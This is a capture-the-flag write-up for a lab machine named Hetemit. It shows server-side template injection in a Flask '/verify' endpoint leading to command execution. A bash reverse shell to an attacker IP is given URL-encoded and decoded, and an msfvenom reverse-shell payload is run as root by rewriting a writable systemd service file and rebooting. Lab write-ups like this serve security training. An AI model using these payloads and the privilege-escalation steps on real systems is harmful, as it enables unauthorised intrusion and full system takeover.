# Hetemit

### Enumeration

```
50000/tcp open  http        Werkzeug httpd 1.0.1 (Python 3.6.8)
| http-methods: 
|_  Supported Methods: GET OPTIONS HEAD
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
```

```
http://192.168.181.117:50000/verify

In the response:
{code}
---
POST /verify HTTP/1.1
Host: 192.168.181.117:50000
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 12

code={5*5}

In the response:
{25}
---
SSTI to RCE
---
POST /verify HTTP/1.1
code={os.popen("id").read()}

In the response:
{'uid=1000(cmeeks) gid=1000(cmeeks) groups=1000(cmeeks)\n'}
```

### Initial Access

```
POST /verify HTTP/1.1
...
code={os.popen("%2f%62%69%6e%2f%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%34%39%2e%31%37%39%2f%38%30%20%30%3e%26%31").read()}

#URL Encoded
code={os.popen("/bin/bash -i >& /dev/tcp/192.168.49.179/80 0>&1").read()}
```

### PrivEsc

```
[cmeeks@hetemit ~]$ sudo -l

User cmeeks may run the following commands on hetemit:
    (root) NOPASSWD: /sbin/halt, /sbin/reboot, /sbin/poweroff

You have write privileges over /etc/systemd/system/pythonapp.service
```

The most important parameters here are :&#x20;

• User : The user that the service will run as.&#x20;

• Execstart : It specifies the command that will run when the service starts.

Now we want to get shell as root. There are many ways to do so with systemd services.

```
[cmeeks@hetemit ~]$ cat /etc/systemd/system/pythonapp.service
[Unit]
Description=Python App
After=network-online.target

[Service]
Type=simple
WorkingDirectory=/home/cmeeks/restjson_hetemit
ExecStart=flask run -h 0.0.0.0 -p 50000
TimeoutSec=30
RestartSec=15s
User=cmeeks
ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

```
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.49.179 LPORT=80 -f elf -o reverse.elf
```

```
[cmeeks@hetemit ~]$ echo "
[Unit]
Description=Python App
After=network-online.target

[Service]
Type=simple
WorkingDirectory=/home/cmeeks/restjson_hetemit
ExecStart=/tmp/reverse.elf
TimeoutSec=30
RestartSec=15s
User=root
ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure

[Install]
WantedBy=multi-user.target
" > /etc/systemd/system/pythonapp.service

[cmeeks@hetemit ~]$ sudo reboot --reboot -f
```
